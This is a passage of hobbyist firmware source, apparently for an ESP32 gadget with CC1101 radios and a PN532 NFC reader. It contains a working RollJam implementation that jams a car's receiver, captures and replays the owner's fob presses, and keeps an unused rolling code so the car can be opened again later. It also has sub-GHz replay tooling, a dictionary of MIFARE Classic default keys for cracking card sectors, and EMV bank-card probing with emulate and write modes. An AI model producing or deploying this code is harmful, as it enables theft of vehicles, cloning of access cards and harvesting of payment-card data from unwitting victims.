    unsigned long avgDelta = 0;
    int similarity = 0;
    compareSubGhzAligned(similarity, avgDelta, bestOffset, compareCount);
    sgLastSimilarityPct = similarity;
    sgLastAvgDeltaUs = avgDelta;
    sgLastDynamicCandidate = similarity < 70;
    Serial.printf("[CC1101] compare prev_edges=%d curr_edges=%d start_prev=%u start_curr=%u similarity=%d%% avg_delta=%luus offset=%d compared=%d\n",
                  sgPrevPulseCount, sgPulseCount, sgPrevStartLevel, sgStartLevel,
                  sgLastSimilarityPct, sgLastAvgDeltaUs, bestOffset, compareCount);
    Serial.println(sgLastDynamicCandidate
      ? "[CC1101] rolling-code clue: burst differs from previous press"
      : "[CC1101] fixed-code clue: aligned burst is similar to previous press");
    // Human-readable verdict for field use
    if (sgLastSimilarityPct >= 85)
      Serial.printf("[CC1101] CODE TYPE: FIXED (sim=%d%%) — replay should work. If it didn't, check frequency with serial 'f'\n", sgLastSimilarityPct);
    else if (sgLastSimilarityPct >= 50)
      Serial.printf("[CC1101] CODE TYPE: UNCERTAIN (sim=%d%%) — run freq scanner, try replay once\n", sgLastSimilarityPct);
    else
      Serial.printf("[CC1101] CODE TYPE: ROLLING? (sim=%d%%) — replay will likely be rejected. RollJam needs a working second CC1101\n", sgLastSimilarityPct);
  } else {
    sgLastSimilarityPct = -1;
    sgLastAvgDeltaUs = 0;
    sgLastDynamicCandidate = false;
    Serial.println("[CC1101] compare prev=none; capture the same remote twice for rolling/fixed clue");
  }

  int minEdges = strcmp(sgTargetClass, "rolling_code_car_attempt") == 0 ? 60 : 18;
  bool qualityOk = sgPulseCount >= minEdges && sgCaptureRssi > -90;
  if (qualityOk) {
    sgCapture.valid = true;
    sgCapture.pulseLen = sgPulseCount;
    tryDecodeProtocol();
    saveSubGhzCapture();
    memcpy(sgPrevEdgesUs, sgEdgesUs, sizeof(sgEdgesUs));
    sgPrevPulseCount = sgPulseCount;
    sgPrevStartLevel = sgStartLevel;

    // RollJam phase transitions (two-CC1101 attack)
    if (sgRJPhase == RJ_JAMMING_WAIT_P1) {
      // Press 1 captured while jammer was ON (car didn't receive it)
      memcpy(sgRJCode1, sgEdgesUs, sizeof(sgEdgesUs));
      sgRJCode1Count = sgPulseCount;
      sgRJCode1Start = sgStartLevel;
      sgRJPhase = RJ_STOP_JAM_REPLAY_P1;
      stopJammer();
      // Immediately replay press 1 → car opens; victim thinks fob worked
      // Swap edges to press-1 data, replay, then restore
      replaySubGhzCapture();
      // Now arm for press 2 (jammer is OFF so car will NOT receive it)
      sgRJPhase = RJ_WAIT_P2;
      armSubGhzCapture("rolljam_p2");
      Serial.println("[RollJam] P1 captured+replayed → car opened. Jammer OFF, arming P2.");
      triggerReaction(MOOD_ANGRY, "RollJam P1", "car opened!");
    } else if (sgRJPhase == RJ_WAIT_P2) {
      // Press 2 captured — now held as valid unused rolling code
      sgRJPhase = RJ_COMPLETE;
      Serial.printf("[RollJam] P2 captured edges=%d — this code unused, replay later to open car again\n",
                    sgPulseCount);
      Serial.println("[RollJam] Press 'r' to replay P2 (opens car a second time)");
      triggerReaction(MOOD_SUCCESS, "RollJam done", "P2 held!");
    }

    // Multi-press session: advance counter, arm next press if session still running
    if (sgSessionTarget > 0) {
      sgSessionCount++;
      Serial.printf("[CC1101] session press %u/%u captured edges=%d similarity=%d%% %s\n",
                    sgSessionCount, sgSessionTarget, sgPulseCount,
                    sgLastSimilarityPct >= 0 ? sgLastSimilarityPct : 0,
                    sgLastDynamicCandidate ? "DYN" : (sgLastSimilarityPct < 0 ? "first" : "STAT"));
      if (sgSessionCount < sgSessionTarget) {
        char lbl[16]; snprintf(lbl, sizeof(lbl), "press %u", sgSessionCount + 1);
        triggerReaction(MOOD_WORKING, "Got press", lbl);
        armSubGhzCapture(lbl);
      } else {
        // Session complete — print summary
        sgSessionTarget = 0;
        sgSessionCount  = 0;
        Serial.printf("[CC1101] session complete pair_id=%lu; pull SD and compare *_%lukHz.json files\n",
                      sgPairId, (unsigned long)(sgActiveFreqMHz * 1000.0f + 0.5f));
        Serial.println("[CC1101] study tip: compare edges_us arrays across files; constant edges = timing structure, variable = rolling counter");
        triggerReaction(MOOD_SUCCESS, "Session done", "check SD");
      }
    } else {
      triggerReaction(MOOD_SUCCESS, "RF captured", sgNeedSecondCapture ? "press1 ok" : "saved");
    }
  } else {
    sgCapture.valid = false;
    sgWaveReady = false;
    Serial.printf("[CC1101] Ignored (%d edges, min=%d rssi=%ddBm): weak/short capture\n",
                  sgPulseCount, minEdges, sgCaptureRssi);
    triggerReaction(MOOD_FAIL, "Weak signal", "try again");
  }
}

void startSubGhz() {
  if (!cc1101Ok) return;
  DBG_PRINTLN("[CC1101] Sub-GHz screen start");
  Serial.println("[CC1101] serial helpers: 1=car 2=gate 5=fan 8=appliance 6=set315MHz(fan) 7=set433MHz 3=rolling+arm 4=4press 0=unknown f=freqscan u=bw-tune j=rolljam(if jammer fitted)");
  Serial.println("[CC1101] serial x=toy rolling-code simulator report");
  Serial.println("[CC1101] rolling classify: send 3 -> press remote once -> OK -> press remote again");
  Serial.println("[CC1101] replay: after capture -> OK replay -> UP accepted / serial i interaction / DOWN rejected");
  sgCapture.valid = false;
  sgWaveReady     = false;
  sgListening     = true;
  configureSubGhzRawRx(sgActiveFreqMHz, false);  // ensure RX mode — RSSI invalid in IDLE
  // Calibrate noise floor over 500ms
  int sum = 0;
  for (int i = 0; i < 20; i++) { sum += ELECHOUSE_cc1101.getRssi(); delay(25); }
  sgNoiseFloor = sum / 20;
  Serial.printf("[CC1101] Noise floor: %ddBm\n", sgNoiseFloor);
  triggerReaction(MOOD_WORKING, "Sub-GHz", "listening...");
}

void stopSubGhz() {
  DBG_PRINTLN("[CC1101] Sub-GHz stop");
  sgListening = false;
}

// ──────────────────────────────────────────────────────────────────
// TWO-CC1101 ROLLJAM
// Spare CC1101 (CS=GPIO2) jams car RX at 433.80 MHz.
// Primary CC1101 (CS=GPIO15) receives fob at 433.92 MHz on narrow BW.
// Why separate frequencies: car RX BW ≈ ±150kHz (433.80 inside it →
// car jammed); VariOne RX BW set to ±58kHz (433.80 is 120kHz away →
// VariOne NOT jammed). Independent impl of Samy Kamkar RollJam concept.
// ──────────────────────────────────────────────────────────────────

void initCC1101Jammer() {
#if !ENABLE_CC1101_JAMMER
  cc1101JamOk = false;
  Serial.println("[CC1101-JAM] disabled - second CC1101 marked broken; single-radio capture/replay only");
  return;
#endif
  pinMode(PIN_CC2_CS, OUTPUT);
  digitalWrite(PIN_CC2_CS, HIGH);
  cc1101Jam.setSpiPin(PIN_VSPI_SCK, PIN_VSPI_MISO, PIN_VSPI_MOSI, PIN_CC2_CS);
  cc1101Jam.Init();
  // Verify chip present: CC1101 PARTNUM register always returns 0x00
  byte partnum = cc1101Jam.SpiReadStatus(CC1101_PARTNUM);
  cc1101JamOk = (partnum == 0x00);
  if (!cc1101JamOk) {
    Serial.printf("[CC1101-JAM] not found CS=GPIO%d (PARTNUM=0x%02X) — D2 LED released\n",
                  PIN_CC2_CS, partnum);
    // Release GPIO2 so onboard LED turns off and strapping pin is harmless
    pinMode(PIN_CC2_CS, INPUT);
    return;
  }
  cc1101Jam.setMHZ(433.80);
  cc1101Jam.setModulation(2);   // ASK/OOK
  cc1101Jam.SpiStrobe(CC1101_SIDLE);
  Serial.printf("[CC1101-JAM] ready CS=GPIO%d freq=433.80MHz (jammer offset -120kHz)\n", PIN_CC2_CS);
}

void startJammer() {
  if (!cc1101JamOk) {
    Serial.println("[CC1101-JAM] not available - second CC1101 disabled/broken; use single-radio capture/replay");
    triggerReaction(MOOD_FAIL, "No jammer", "single radio");
    return;
  }
  // Narrow RX BW on primary CC1101 to reject jammer leakage
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_MDMCFG4, CC1101_MDMCFG4_NARROW);
  cc1101Jam.SetTx();  // continuous carrier on 433.80 MHz
  Serial.println("[CC1101-JAM] jammer ON — car RX blocked at 433.80MHz");
}

void stopJammer() {
  if (!cc1101JamOk) return;
  cc1101Jam.SpiStrobe(CC1101_SIDLE);  // stop TX immediately
  // Restore primary receiver to the same raw OOK mode used by normal capture.
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  Serial.println("[CC1101-JAM] jammer OFF — car RX restored");
}

void startRollJam() {
  if (!cc1101Ok) { triggerReaction(MOOD_FAIL, "No CC1101", "check wiring"); return; }
  if (!cc1101JamOk) {
    Serial.println("[RollJam] blocked - second CC1101 disabled/broken. Single-radio capture/replay still works.");
    triggerReaction(MOOD_FAIL, "No jammer", "2nd CC broken");
    return;
  }
  sgRJPhase      = RJ_JAMMING_WAIT_P1;
  sgRJCode1Count = 0;
  setSubGhzTargetClass("rolling_code_car_attempt");
  sgPairId      = millis();
  sgCaptureIndex = 1;
  sgNeedSecondCapture = false;
  sgSessionTarget = 0;
  Serial.printf("[RollJam] start pair_id=%lu — jammer ON, arm for press 1\n", sgPairId);
  startJammer();
  armSubGhzCapture("rolljam_p1");
  currentState = STATE_SUBGHZ_ROLLJAM;
  triggerReaction(MOOD_ANGRY, "RollJam ON", "press fob");
}

// ──────────────────────────────────────────────────────────────────
// PROTOCOL DECODERS  (TE-based, algorithms derived from Flipper Zero
// Sub-GHz documentation and file-format spec — no source copied)
// ──────────────────────────────────────────────────────────────────

// Estimate TE (quantisation interval) as the shortest edge > 80µs
static uint16_t estimateTE(const uint16_t* edges, int n) {
  uint16_t te = 65535;
  for (int i = 0; i < n; i++)
    if (edges[i] > 80 && edges[i] < te) te = edges[i];
  return te == 65535 ? 0 : te;
}

static bool nearTE(uint16_t val, uint16_t te, int mult, int tol40pct) {
  int target = te * mult;
  int lo = target - tol40pct;
  int hi = target + tol40pct;
  return val >= lo && val <= hi;
}

// Princeton PT2262 / EV1527 — identical wire encoding, 24-bit OOK static code
// EV1527 (most common in Egyptian aftermarket kits) = same format as PT2262
// '0'=1T high+3T low, '1'=3T high+1T low, sync=1T high+31T low
// TE typically 300-500 µs; 24 bits × 2 edges = 48 edges per frame
bool tryDecodePrinceton(const uint16_t* edges, int n, char* out, int outLen) {
  // Find first sync gap (long edge ≥ 5 ms = 31T at TE=160µs min).
  // Estimate TE only from post-sync edges so leading junk doesn't corrupt it.
  int syncIdx = -1;
  for (int i = 0; i < n; i++) {
    if (edges[i] >= 5000) { syncIdx = i; break; }
  }
  // No sync gap found — try full array as fallback (short captures)
  int dataStart = (syncIdx >= 0) ? syncIdx + 1 : 0;
  if (dataStart >= n) return false;

  uint16_t te = estimateTE(edges + dataStart, n - dataStart);
  if (te < 180 || te > 700) return false;
  int tol = te * 40 / 100;

  // Level polarity at dataStart: if syncIdx found, post-sync edge is always
  // paired as (hi, lo) where hi = first edge after sync gap.  The sync gap
  // itself is a long-LOW (odd parity from start_level=0 or even from 1);
  // we don't track absolute polarity here — we just need consistent pairs.
  char bits[25]; int bc = 0;
  for (int i = dataStart; i + 1 < n && bc < 24; i += 2) {
    uint16_t hi = edges[i], lo = edges[i + 1];
    if (hi >= 5000 || lo >= 5000) continue;  // skip any embedded sync gaps
    if (nearTE(hi, te, 1, tol) && nearTE(lo, te, 3, tol))      bits[bc++] = '0';
    else if (nearTE(hi, te, 3, tol) && nearTE(lo, te, 1, tol)) bits[bc++] = '1';
    else return false;
  }
  if (bc < 12) return false;
  bits[bc] = '\0';
  unsigned long code = 0;
  for (int i = 0; i < bc; i++) code = (code << 1) | (bits[i] - '0');
  snprintf(out, outLen, "Princeton/EV1527 %db 0x%06lX te=%uus", bc, code, te);
  return true;
}

// HT6P20B (Holtek) — 28-bit PWM-encoded OOK, very common in Egyptian market
// Frame: PILOT(23×LOW + 1×HIGH) | 22-bit ADDR | 2-bit DATA | 4-bit ANTI(always 0101)
// λ = pilot_total_low / 23; bit '1'=1λ high+2λ low; bit '0'=2λ high+1λ low
// Ref: Holtek HT6P20B datasheet + Arduino forum decoder analysis
bool tryDecodeHT6P20B(const uint16_t* edges, int n, char* out, int outLen) {
  // Pilot starts as LOW (long first edge if sgStartLevel=0, or skip leading HIGH)
  int start = 0;
  // If first edge is HIGH (< 2ms) skip it to align to pilot LOW
  if (n > 0 && edges[0] < 2000) start = 1;
  if (start >= n) return false;

  // Pilot LOW ≥ 10 ms (23 × ~500µs = ~11.5ms minimum)
  if (edges[start] < 8000) return false;
  uint32_t pilotLow = edges[start];
  uint16_t lam = (uint16_t)(pilotLow / 23);  // λ
  if (lam < 150 || lam > 800) return false;
  int tol = lam * 40 / 100;

  // After pilot LOW comes pilot HIGH (~1λ), then data pairs
  int dataStart = start + 2;  // skip pilotLow + pilotHigh
  if (dataStart + 55 > n) return false;  // need 28 bits × 2 edges = 56 edges

  char bits[29]; int bc = 0;
  for (int i = dataStart; i + 1 < n && bc < 28; i += 2) {
    uint16_t hi = edges[i], lo = edges[i + 1];
    if (nearTE(hi, lam, 1, tol) && nearTE(lo, lam, 2, tol))      bits[bc++] = '1';
    else if (nearTE(hi, lam, 2, tol) && nearTE(lo, lam, 1, tol)) bits[bc++] = '0';
    else return false;
  }
  if (bc < 28) return false;
  bits[bc] = '\0';

  // Verify anti-code (last 4 bits must be 0101)
  if (bits[24]!='0' || bits[25]!='1' || bits[26]!='0' || bits[27]!='1') return false;

  // Extract address (22 bits) and data (2 bits)
  unsigned long addr = 0, data = 0;
  for (int i = 0;  i < 22; i++) addr = (addr << 1) | (bits[i] - '0');
  for (int i = 22; i < 24; i++) data = (data << 1) | (bits[i] - '0');
  snprintf(out, outLen, "HT6P20B addr=0x%06lX data=%lu", addr, data);
  return true;
}

// CAME 12-bit — T≈320µs, '0'=T+T, '1'=T+2T, preamble=long high
bool tryDecodeCAME(const uint16_t* edges, int n, char* out, int outLen) {
  int start = 0;
  // skip preamble (first edge > 5 ms)
  if (n > 0 && edges[0] > 5000) start = 1;
  if (n - start < 24) return false;

  uint16_t te = estimateTE(edges + start, n - start);
  if (te < 200 || te > 600) return false;
  int tol = te * 40 / 100;

  char bits[13]; int bc = 0;
  for (int i = start; i + 1 < n && bc < 12; i += 2) {
    uint16_t hi = edges[i], lo = edges[i + 1];
    if (nearTE(hi, te, 1, tol) && nearTE(lo, te, 1, tol))      bits[bc++] = '0';
    else if (nearTE(hi, te, 1, tol) && nearTE(lo, te, 2, tol)) bits[bc++] = '1';
    else return false;
  }
  if (bc < 12) return false;
  bits[bc] = '\0';
  unsigned long code = 0;
  for (int i = 0; i < bc; i++) code = (code << 1) | (bits[i] - '0');
  snprintf(out, outLen, "CAME 12b 0x%03lX", code);
  return true;
}

// Nice Flo 12-bit — T≈700µs, '0'=2T+1T, '1'=1T+2T
bool tryDecodeNiceFlo(const uint16_t* edges, int n, char* out, int outLen) {
  // skip preamble if first edge very long (sync low > 15ms)
  int start = (n > 0 && edges[0] > 15000) ? 1 : 0;
  if (n - start < 24) return false;

  uint16_t te = estimateTE(edges + start, n - start);
  if (te < 400 || te > 1200) return false;
  int tol = te * 40 / 100;

  char bits[13]; int bc = 0;
  for (int i = start; i + 1 < n && bc < 12; i += 2) {
    uint16_t hi = edges[i], lo = edges[i + 1];
    if (nearTE(hi, te, 2, tol) && nearTE(lo, te, 1, tol))      bits[bc++] = '0';
    else if (nearTE(hi, te, 1, tol) && nearTE(lo, te, 2, tol)) bits[bc++] = '1';
    else return false;
  }
  if (bc < 12) return false;
  bits[bc] = '\0';
  unsigned long code = 0;
  for (int i = 0; i < bc; i++) code = (code << 1) | (bits[i] - '0');
  snprintf(out, outLen, "NiceFlo 12b 0x%03lX", code);
  return true;
}

void tryDecodeProtocol() {
  snprintf(sgDecodedProtocol, sizeof(sgDecodedProtocol), "unknown");
  sgDecodedBits[0] = '\0';
  char tmp[64];
  if (tryDecodeHT6P20B(sgEdgesUs, sgPulseCount, tmp, sizeof(tmp))) {
    snprintf(sgDecodedProtocol, sizeof(sgDecodedProtocol), "HT6P20B");
    snprintf(sgDecodedBits, sizeof(sgDecodedBits), "%s", tmp);
    Serial.printf("[CC1101] decode HT6P20B: %s\n", tmp);
  } else if (tryDecodePrinceton(sgEdgesUs, sgPulseCount, tmp, sizeof(tmp))) {
    snprintf(sgDecodedProtocol, sizeof(sgDecodedProtocol), "Princeton/EV1527");
    snprintf(sgDecodedBits, sizeof(sgDecodedBits), "%s", tmp);
    Serial.printf("[CC1101] decode Princeton/EV1527: %s\n", tmp);
  } else if (tryDecodeCAME(sgEdgesUs, sgPulseCount, tmp, sizeof(tmp))) {
    snprintf(sgDecodedProtocol, sizeof(sgDecodedProtocol), "CAME");
    snprintf(sgDecodedBits, sizeof(sgDecodedBits), "%s", tmp);
    Serial.printf("[CC1101] decode CAME: %s\n", tmp);
  } else if (tryDecodeNiceFlo(sgEdgesUs, sgPulseCount, tmp, sizeof(tmp))) {
    snprintf(sgDecodedProtocol, sizeof(sgDecodedProtocol), "NiceFlo");
    snprintf(sgDecodedBits, sizeof(sgDecodedBits), "%s", tmp);
    Serial.printf("[CC1101] decode NiceFlo: %s\n", tmp);
  } else {
    Serial.println("[CC1101] decode: no match (HT6P20B/Princeton/EV1527/CAME/NiceFlo) — raw OOK only");
  }
}

// ──────────────────────────────────────────────────────────────────
// FREQUENCY SCANNER  (Flipper-inspired: scan ISM bands, find active)
// ──────────────────────────────────────────────────────────────────
static int subGhzScanScore(int edges, int rssi) {
  int signal = constrain(rssi + 95, 0, 80);
  return edges + (signal * 20);
}

void runFreqScan() {
  if (!cc1101Ok) return;
  sgListening = false;
  for (int i = 0; i < SG_SCAN_NFREQS; i++) { sgFreqScanRssi[i] = -100; sgFreqScanEdges[i] = 0; }

  // Multi-pass sweep: 4 passes × 9 freqs × 250 ms = ~9 s total.
  // RSSI is unreliable on this hardware (reads -74 in IDLE regardless of signal).
  // GDO0 edge count is the reliable indicator — accumulated across all passes.
  // User holds remote button for the full 9 s; each pass gives every freq a 250 ms window.
  Serial.println("[CC1101] freq scan start — HOLD remote button for the entire scan (~9s)");
  const int PASSES = 4;
  const int DWELL_MS = 250;
  for (int pass = 0; pass < PASSES; pass++) {
    Serial.printf("[CC1101] scan pass %d/%d\n", pass + 1, PASSES);
    for (int i = 0; i < SG_SCAN_NFREQS; i++) {
      sgFreqScanIdx = i;
      configureSubGhzRawRx(SG_SCAN_FREQS[i], true);
      delay(60);  // PLL relock (wide BW = faster settle)
      uint8_t lastGdo = digitalRead(4);
      unsigned long dwellStart = millis();
      while (millis() - dwellStart < DWELL_MS) {
        uint8_t gdo = digitalRead(4);
        if (gdo != lastGdo) { sgFreqScanEdges[i]++; lastGdo = gdo; }
        delayMicroseconds(200);
      }
      Serial.printf("[CC1101] %.3fMHz edges=%d\n", SG_SCAN_FREQS[i], sgFreqScanEdges[i]);
    }
    // Update OLED once per pass
    drawSubGhzFreqScan();
  }

  // Pick winner by edge activity with RSSI as a tie-breaker. Edges are still
  // king: clean GDO0 transitions mean the OOK waveform is actually visible.
  int best = 0;
  int bestScore = -1;
  for (int i = 0; i < SG_SCAN_NFREQS; i++) {
    configureSubGhzRawRx(SG_SCAN_FREQS[i], true);
    delay(50);
    sgFreqScanRssi[i] = ELECHOUSE_cc1101.getRssi();
    int score = subGhzScanScore(sgFreqScanEdges[i], sgFreqScanRssi[i]);
    if (score > bestScore) {
      bestScore = score;
      best = i;
    }
  }
  sgFreqScanIdx = best;
  sgActiveFreqMHz = SG_SCAN_FREQS[best];
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  sgListening = true;
  Serial.printf("[CC1101] freq scan done; winner=%.3fMHz edges=%d rssi=%ddBm score=%d bw=%.0fkHz\n",
                sgActiveFreqMHz, sgFreqScanEdges[best], sgFreqScanRssi[best],
                bestScore, SG_RX_BWS[sgActiveBwIdx]);
  if (sgFreqScanEdges[best] == 0)
    Serial.println("[CC1101] all edges=0 — hold remote 5 cm from CC1101 antenna and rescan");
}

void runBwTune() {
  if (!cc1101Ok) return;
  sgListening = false;
  for (int i = 0; i < SG_RX_NBWS; i++) { sgBwScanRssi[i] = -100; sgBwScanEdges[i] = 0; }

  Serial.printf("[CC1101] BW tune start %.3fMHz — HOLD remote button for ~6s\n", sgActiveFreqMHz);
  int best = sgActiveBwIdx;
  int bestScore = -1;

  for (int i = 0; i < SG_RX_NBWS; i++) {
    sgActiveBwIdx = i;
    configureSubGhzRawRx(sgActiveFreqMHz, false);
    delay(70);

    uint8_t lastGdo = digitalRead(4);
    unsigned long dwellStart = millis();
    while (millis() - dwellStart < 700) {
      uint8_t gdo = digitalRead(4);
      if (gdo != lastGdo) { sgBwScanEdges[i]++; lastGdo = gdo; }
      delayMicroseconds(150);
    }
    sgBwScanRssi[i] = ELECHOUSE_cc1101.getRssi();
    int score = subGhzScanScore(sgBwScanEdges[i], sgBwScanRssi[i]);
    Serial.printf("[CC1101] tune bw=%.0fkHz edges=%d rssi=%ddBm score=%d\n",
                  SG_RX_BWS[i], sgBwScanEdges[i], sgBwScanRssi[i], score);
    if (score > bestScore) {
      bestScore = score;
      best = i;
    }
  }

  sgActiveBwIdx = best;
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  sgListening = true;
  Serial.printf("[CC1101] BW tune done; winner=%.0fkHz edges=%d rssi=%ddBm score=%d\n",
                SG_RX_BWS[sgActiveBwIdx], sgBwScanEdges[best],
                sgBwScanRssi[best], bestScore);
  triggerReaction(MOOD_SUCCESS, "BW tuned", String((int)SG_RX_BWS[sgActiveBwIdx]).c_str());
}

void setActiveFreq(int idx) {
  if (idx < 0 || idx >= SG_SCAN_NFREQS) return;
  sgFreqScanIdx  = idx;
  sgActiveFreqMHz = SG_SCAN_FREQS[idx];
  if (cc1101Ok) {
    configureSubGhzRawRx(sgActiveFreqMHz, false);   // must be in RX before RSSI reads are valid
    int sum = 0;
    for (int i = 0; i < 10; i++) { sum += ELECHOUSE_cc1101.getRssi(); delay(25); }
    sgNoiseFloor = sum / 10;
    sgListening = true;
  }
  Serial.printf("[CC1101] active freq=%.2fMHz floor=%ddBm\n", sgActiveFreqMHz, sgNoiseFloor);
  triggerReaction(MOOD_THINKING, "Freq set", String(sgActiveFreqMHz, 2).c_str());
}

void setSubGhzTargetClass(const char* targetClass) {
  bool changed = strcmp(sgTargetClass, targetClass) != 0;
  snprintf(sgTargetClass, sizeof(sgTargetClass), "%s", targetClass);
  Serial.printf("[CC1101] target_class=%s\n", sgTargetClass);
  if (changed) {
    sgPrevPulseCount = 0;
    sgLastSimilarityPct = -1;
    sgLastAvgDeltaUs = 0;
    sgLastDynamicCandidate = false;
    sgNeedSecondCapture = false;
    Serial.println("[CC1101] comparison reset because target_class changed");
  }
  triggerReaction(MOOD_THINKING, "RF target", sgTargetClass);
}

void armSubGhzCapture(const char* label) {
  sgArmed = true;
  sgListening = true;
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  sgArmLastGdo = digitalRead(4);
  sgArmTime = millis();
  if (strcmp(label, "press 1") == 0) sgCaptureIndex = 1;
  else if (strcmp(label, "press 2") == 0) sgCaptureIndex = 2;
  else if (sgPairId == 0) sgCaptureIndex = 1;
  sgCapture.valid = false;
  sgWaveReady = false;
  sgLoadedFromSd = false;
  sgAwaitReplayResult = false;
  Serial.printf("[CC1101] armed capture: %s target_class=%s window=%dms baseline_gdo=%u rssi_floor=%d\n",
                label, sgTargetClass, SG_ARM_WINDOW, sgArmLastGdo, sgNoiseFloor);
  triggerReaction(MOOD_WORKING, "RF armed", label);
}

// === NFC (PN532 via I2C) ===
Adafruit_PN532 nfc532(PIN_NFC_IRQ, PIN_NFC_RST_NONE);  // I2C: IRQ=13, no reset pin wired

struct NfcCard {
  char uid[22];
  char type[22];
  char network[14];
  char aid[33];
  char panMasked[24];
  char expiry[8];
  char holder[24];
  uint8_t sak;
  uint8_t uidLen;
  bool valid;
};
NfcCard nfcCard = {"", "", "", "", "", "", "", 0, 0, false};
bool nfcReady = false;
unsigned long nfcLastScan = 0;
unsigned long nfcLastNoCardLog = 0;
bool nfcEmvProbeEnabled = true;
bool nfcSawPpse = false;
bool nfcSawAidSelect = false;
bool nfcSawGpo = false;
bool nfcSawRecord = false;
char nfcLimitStage[18] = "no-card";
unsigned long nfcScanStartMs = 0;
unsigned long nfcScanElapsedMs = 0;

// Transaction log (tag 9F4D) and ATC (tag 9F36)
uint8_t nfcLogSfi     = 0;
uint8_t nfcLogMaxRec  = 0;
uint8_t nfcAtc[2]     = {0, 0};
int     nfcTxLogCount = 0;

// === MIFARE CLASSIC ===
#define MIFARE_SECTOR_COUNT    16
#define MIFARE_BLOCKS_TOTAL    64   // 16 sectors × 4 blocks
#define MIFARE_KEY_DICT_SIZE   10

static const uint8_t mifareKeyDict[MIFARE_KEY_DICT_SIZE][6] = {
  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},
  {0x00,0x00,0x00,0x00,0x00,0x00},
  {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
  {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
  {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
  {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
  {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
  {0x71,0x4C,0x5C,0x88,0x6E,0x97}
};

struct NfcMifareCard {
  char    uid[22];
  uint8_t uidRaw[7];
  uint8_t uidLen;
  uint8_t sak;
  bool    sectorUnlocked[MIFARE_SECTOR_COUNT];
  uint8_t sectorKeyUsed[MIFARE_SECTOR_COUNT][6];
  bool    sectorKeyIsB[MIFARE_SECTOR_COUNT];
  uint8_t blocks[MIFARE_BLOCKS_TOTAL][16];
  int     sectorsRead;
  bool    valid;
};

// Phases within STATE_NFC_ACCESS
enum NfcAccessPhase {
  NFC_ACC_SCANNING,
  NFC_ACC_READY,
  NFC_ACC_EMULATING,
  NFC_ACC_WRITE_CONFIRM,
  NFC_ACC_WRITING,
  NFC_ACC_WRITE_DONE,
  NFC_ACC_WRITE_FAIL
};

NfcMifareCard   mifareCard;
NfcAccessPhase  nfcAccessPhase  = NFC_ACC_SCANNING;
char            mifareStatus[36] = "";
bool            mifareReady     = false;
unsigned long   nfcAccessLastScan = 0;

bool     nfcEmulateGotHit  = false;
unsigned long nfcEmulateLastTry = 0;
char     nfcWriteStatus[36] = "";

int  nfcMenuIdx = 0;

// Saved Mifare list (files in NFC_CAPTURE_DIR ending in _mfc.bin)
#define NFC_SAVED_MAX 12
char nfcSavedPaths[NFC_SAVED_MAX][56];
char nfcSavedLabels[NFC_SAVED_MAX][20];
int  nfcSavedCount  = 0;
int  nfcSavedIdx    = 0;
int  nfcSavedScroll = 0;

void printNfcLimitSimulation();

static const char* nfcNetworkFromAID(const uint8_t* aid, uint8_t len) {
  if (len < 5) return nullptr;
  if (memcmp(aid, "\xA0\x00\x00\x00\x03", 5) == 0) return "Visa";
  if (memcmp(aid, "\xA0\x00\x00\x00\x04", 5) == 0) return "Mastercard";
  if (memcmp(aid, "\xA0\x00\x00\x00\x25", 5) == 0) return "Amex";
  if (memcmp(aid, "\xA0\x00\x00\x00\x65", 5) == 0) return "JCB";
  if (memcmp(aid, "\xA0\x00\x00\x06\x86", 5) == 0) return "Interac";
  if (memcmp(aid, "\xA0\x00\x00\x07\x87", 5) == 0) return "Meeza";
  return nullptr;
}

static void nfcHex(const uint8_t* data, uint8_t len, char* out, size_t outSize) {
  char* p = out;
  size_t left = outSize;
  for (uint8_t i = 0; i < len && left > 2; i++) {
    int n = snprintf(p, left, "%02X", data[i]);
    p += n;
    left -= n;
  }
}

static bool nfcApdu(const char* label, const uint8_t* apdu, uint8_t apduLen, uint8_t* rsp, uint8_t* rspLen) {
  *rspLen = 96;
  Serial.printf("[NFC-APDU] %s tx_len=%u\n", label, apduLen);
  if (!nfc532.inDataExchange((uint8_t*)apdu, apduLen, rsp, rspLen)) {
    Serial.printf("[NFC-APDU] %s transport_fail\n", label);
    return false;
  }
  if (*rspLen < 2) {
    Serial.printf("[NFC-APDU] %s short_rsp len=%u\n", label, *rspLen);
    return false;
  }
  uint8_t sw1 = rsp[*rspLen - 2];
  uint8_t sw2 = rsp[*rspLen - 1];
  bool ok = sw1 == 0x90 && sw2 == 0x00;
  Serial.printf("[NFC-APDU] %s rsp_len=%u sw=%02X%02X %s\n",
                label, *rspLen, sw1, sw2, ok ? "ok" : "reject");
  return ok;
}

static void nfcMaskPanDigits(const char* digits, char* out, size_t outSize) {
  size_t len = strlen(digits);
  if (!outSize) return;
  if (len < 8) {
    snprintf(out, outSize, "%s", digits);
    return;
  }
  snprintf(out, outSize, "**** **** **** %.4s", digits + len - 4);
}

static void nfcBcdToDigits(const uint8_t* data, uint8_t len, char* out, size_t outSize, bool stopAtF) {
  size_t j = 0;
  for (uint8_t i = 0; i < len && j + 1 < outSize; i++) {
    uint8_t hi = data[i] >> 4;
    uint8_t lo = data[i] & 0x0F;
    if (hi <= 9) out[j++] = '0' + hi;
    else if (stopAtF && hi == 0x0F) break;
    if (j + 1 >= outSize) break;
    if (lo <= 9) out[j++] = '0' + lo;
    else if (stopAtF && lo == 0x0F) break;
  }
  out[j] = '\0';
}

static uint8_t nfcTlvLength(const uint8_t* data, uint8_t len, uint8_t& idx) {
  if (idx >= len) return 0;
  uint8_t l = data[idx++];
  if ((l & 0x80) == 0) return l;
  uint8_t count = l & 0x7F;
  uint16_t v = 0;
  while (count-- && idx < len) v = (v << 8) | data[idx++];
  return (uint8_t)min((int)v, 255);
}

static void nfcParseEmvTlv(NfcCard& card, const uint8_t* data, uint8_t len) {
  uint8_t i = 0;
  while (i + 1 < len) {
    uint16_t tag = data[i++];
    if ((tag & 0x1F) == 0x1F && i < len) tag = (tag << 8) | data[i++];
    uint8_t tlen = nfcTlvLength(data, len, i);
